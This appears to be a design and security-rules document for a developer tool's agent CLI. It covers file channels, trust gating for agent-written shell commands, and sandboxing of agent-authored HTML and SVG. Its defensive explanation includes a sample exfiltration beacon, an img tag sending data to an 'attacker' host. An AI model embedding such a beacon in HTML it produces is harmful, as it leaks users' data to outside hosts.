# Agent CLI, Channels & Active Content

## Contents

- **The agent CLI and its channels** — what the CLI writes, where, and the trust rules
- **Agent-authored active content** — sandboxing HTML/SVG an agent produced
- **CLI install** — how the binary lands in `~/.porcelain`

## The agent CLI and its channels

- **The CLI adds NO inbound network surface.** `apps/cli/` is a short-lived process the user's agent
  runs per command; it never opens a port or socket, only reads/writes local `~/.porcelain/*.json`.
  Don't "upgrade" a channel to an in-app HTTP listener or a long-lived agent server. It stays
  **dependency-free** (Node builtins only) so it runs under a plain `node` — no npm imports in
  `apps/cli/src/`.
- **Rules common to every channel:** both sides write **atomically** (tmp + rename), the app serializes
  its own read-modify-write, content is local-file only, and a malformed entry is **dropped, not
  thrown** (read-side leniency — one bad agent write must never break a surface). Externally-authored
  *paths* are repo-contained on read; externally-authored *regex* is compile-checked on read.

| Channel | Direction | Rule specific to it |
|---|---|---|
| `review-sets.json` | agent authors | The app makes exactly **ONE** write — `clearReviewSet`, user-initiated, deleting a repo's entry. Don't add another. Re-validated with zod on every read because an external process owns it |
| `comments.json` | two-way | The **app** authors comments, so their `path`s are app-supplied and need no containment guard; the CLI only reads and flips `resolved`. A race with a CLI resolve is rare and low-stakes (the watcher re-syncs). Don't add an app-side write that accepts an agent-supplied path |
| `board.json` | two-way | Content is card text — not paths, not commands |
| `actions.json` | two-way | Content is a **shell command** — see below |
| `layers.json` | two-way | Content is **auto-executed regex** — see below |
| `notes.json` | app→agent | App is **sole writer**; CLI has only `notes get`. **No notes-write command** — notes are the human's; captured tasks belong on the board. **No watcher** — nothing pushes back |
| `reviewed.json` | app→agent | App is sole writer; CLI has only `reviewed list`. No mark-write command — "reviewed" is the human's act. No watcher |
| `feature-view.json` | app→agent | App is sole writer; no write command — the snapshot is **derived, not authored**. No watcher. It refreshes only while the Feature surfaces poll, so treat it as "the view as last rendered", never source of truth |
| `scope.json` | two-way | Monorepo hide/pin; watch emits `scope` → tree/pins/search invalidate |

  These live in `~/.porcelain` rather than `userData/config.json` for one reason: **the
  dependency-free CLI must read them off disk.**

- **Review-set paths are repo-contained on read — files AND section anchors.** `readReviewSet` drops
  any FILE whose path is absolute or escapes `repoPath` and filters every SECTION's `anchors` the same
  way, because both flow into `readFile(join(repoPath, path))`. Without it an injected review set reads
  arbitrary local files into the Review. *Verify:* new code reading an agent-supplied path routes
  through the filtered set.
- **Saved actions are agent-writable but HUMAN-executed.** An agent that writes `actions.json` could
  plant a command; four safeguards make that acceptable and all must hold: (1) **nothing in the agent
  channel executes an action** — the CLI has `list/create/update/delete` and **no run verb**; running
  is solely a human click. (2) The **full command text is always visible** in the Actions row before
  the click — never hide or truncate-without-recourse. (3) It runs in a **visible PTY** via the user's
  login shell, so there is no silent background execution. (4) **A command this machine has not
  accepted does not run on one click** — see the trust gate below. *Verify:* the CLI command table has
  no execute verb; the Action row still shows `command`.
- **Command trust is per machine, per command TEXT, and never lives in the repo.**
  `actions.json` moved into `<repo>/.porcelain/` and is Shared by default, so a Run list can now
  arrive with a `git clone`. `action-trust-store.ts` (`~/.porcelain/action-trust.json`) records the
  sha256 of each command the human accepted; `readActionViews` derives `trusted` per read and the
  renderer routes an untrusted action to the accept dialog instead of a PTY. All of these must hold:
  1. Trust is **derived, never persisted into `.porcelain/`** — a repo that could vouch for its own
     commands is not a gate. It is home-only and repo-path-keyed, so it fails closed on rename.
  2. The fingerprint is over the **command**, not the title. A retitled action keeps trust (a label
     cannot execute); an edited command loses it, whoever edited it — agent, teammate, or hand.
  3. App-authored commands (`addAction`/`updateAction`) are trusted **by the act of typing them**.
     Without that, every user would face a wall of prompts for commands they wrote — which is
     exactly how a trust prompt becomes a thing people click through.
  4. **Do not sell this as a sandbox.** A credential holder can already `terminal:create` with any
     input (see the network boundary's "the token holder IS the user"), so a daemon-side block would
     be theatre. What it defends is the human's attention: no one-click on a command they assumed was
     their own. Keep the gate in the renderer, and keep the accept step showing the command in full.
  *Verify:* `action-trust-store.test.ts` — an on-disk write is untrusted, accepting one command does
  not accept its neighbours, and editing behind the app withdraws trust.
- **Flow layers are auto-executed regex.** `compileLayers` runs `new RegExp(pattern, 'g')` on every
  flow build, so **the app's read MUST drop any layer whose pattern doesn't compile** or one bad
  agent-written pattern throws and breaks every grouping view; the CLI rejects an uncompilable pattern
  up front. Patterns run against short repo-relative paths and the human can already type any regex in
  Settings, so the ReDoS surface is unchanged — **don't add a bespoke complexity guard the human path
  lacks**; keep the compile-on-read filter. *Verify:* a CLI-written invalid pattern is dropped, not
  thrown, on the next flow poll.
- **Reviewed marks reconcile at read time.** Each mark is keyed to a content fingerprint (sha256 of the
  file's diff vs HEAD); `reconcileReviewed` prunes a mark whose fingerprint no longer matches and
  writes through, so the JSON stays truthful for the CLI. This is what clears marks after external
  commits, amends, rebases, and post-mark edits — the `gitCommit` clearing is only a fast path. An
  empty fingerprint never matches, so it prunes on first reconcile.

## Agent-authored active content

- **Review-section diagrams and HTML embeds are ACTIVE content — render them ONLY in a fully sandboxed
  iframe; prose and thesis render as escaped markdown.** An external process owns `review-sets.json`,
  so all of these must hold:
  1. A section's `diagram` (executable SVG) and its `html` embed render only inside the existing
     `<iframe sandbox="" srcdoc>` path — the **EMPTY** sandbox attribute: no `allow-scripts`, no
     `allow-same-origin`, no `allow-popups`, ever. Never `dangerouslySetInnerHTML`, never add an
     `allow-*` token, never swap to a `src` URL.
  2. `prose`/`thesis` go through **react-markdown with default escaping — NO `rehype-raw`**, so a
     `<script>` or `<img>` in prose is shown as text.
  3. **The parent CSP is the only thing blocking external subresource loads.** A `srcdoc` document
     inherits it and **sandbox alone does not block passive loads**, so `default-src 'self';
     img-src 'self' data:` is the real backstop against an HTML-only exfil channel
     (`<img src="https://attacker/?leak=...">`) inside a diagram or evidence body. **Never widen
     `img-src`/`default-src`** while any agent-authored HTML can render, and keep the browser-client
     `rewriteCsp` **connect-src-only**. The Electron `connect-src` also allows scheme-wide
     `http:/https:/ws:/wss:` so a remote daemon is reachable — deliberate, and it must not creep into
     the other directives. `font-src 'self' data:` is deliberate (Vite inlines small font subsets as
     data URIs, which the `default-src` fallback would block); a `data:` font is inert, but **never add
     a REMOTE host to `font-src`** — a remote font load IS a beacon.
  4. Anchor paths are repo-contained on read, and the caps (`max` on sections/prose/diagram/html/
     htmlHeight/anchors) are enforced by the whole-file zod parse; a failing section is dropped, never
     thrown.
  5. The app's ONLY write to `review-sets.json` remains `clearReviewSet` — thesis and sections are never
     app-authored.

  *Verify:* the diagram and evidence iframes keep `sandbox=""` with no allow-tokens; prose renders
  without `rehype-raw`; the CSP is byte-unchanged.
- **Loop evidence is directory-on-disk, not an inline HTML payload** —
  `loop-evidence/<sha256(repoPath)[0..16]>/` with `index.html`, sibling screenshots, optional
  `meta.json`. Agents write those with normal Write tools; `evidence prepare` takes **title only** and
  returns the path, because **large base64 through a channel arg is the failure mode this designed
  out**. The app inlines relative `img` src under that dir into data URIs for the sandboxed viewer, and
  the sandbox clause above governs the HTML body. **Structured checks render natively** — plain React
  with the agent-authored label/detail as **escaped text**, not through the iframe — so they add no
  active-content surface; they are bounded on read (≤32 checks, label ≤120, detail ≤400) and a
  malformed entry is dropped, not thrown. Overall status is **DERIVED, never stored**
  (`evidenceOverallStatus`: any fail → fail, else any pass → pass, else null). The cap is a deliberate
  **split** — read-side `MAX_HTML_BYTES` 4 MB for inlined-screenshot headroom, CLI write cap 1.5 MB.
  **Over-cap is not "cleared":** `readEvidence` still returns title/checks/dir with `htmlUnavailable`,
  so the UI says "Evidence too large", never the cleared empty state. `updatedAt` is the later of
  `meta.updatedAt` and `index.html` mtime, so in-place agent edits invalidate without a re-`evidence
  check`. *Verify:* `evidence-store.test.ts` (too-large + mtime); `evidence prepare` returns a path
  without requiring html; overall status is computed, never read from disk.
- **`evidence set` still accepts `--html` (inline or `-` for stdin) OR `--html-file`** (absolute path) —
  but the directory flow above is preferred so large HTML never rides a channel arg.

## CLI install

- **Boot-driven, writes ONLY to `~/.porcelain`, takes no user input.** `ensureCli` copies the bundled
  CLI into `~/.porcelain` and writes + chmods (0755) the `porcelain` sh wrapper. No user string reaches
  a path or command, and **no per-agent config files are written** — agents just run the binary, so
  there is nothing to register. It runs at **every app boot AND every daemon boot**
  (best-effort on both), so an app *or* standalone/remote daemon upgrade ships the current CLI with no
  Settings step — without the daemon path a remote host kept a stale binary forever. Writes are atomic
  and create the parent dir. `git`'s `execFile` (no shell) remains the pattern for the git surface.
  *Verify:* `ensureCli` is called at app boot *and* daemon `main()`; no code writes into agent-host
  config files.

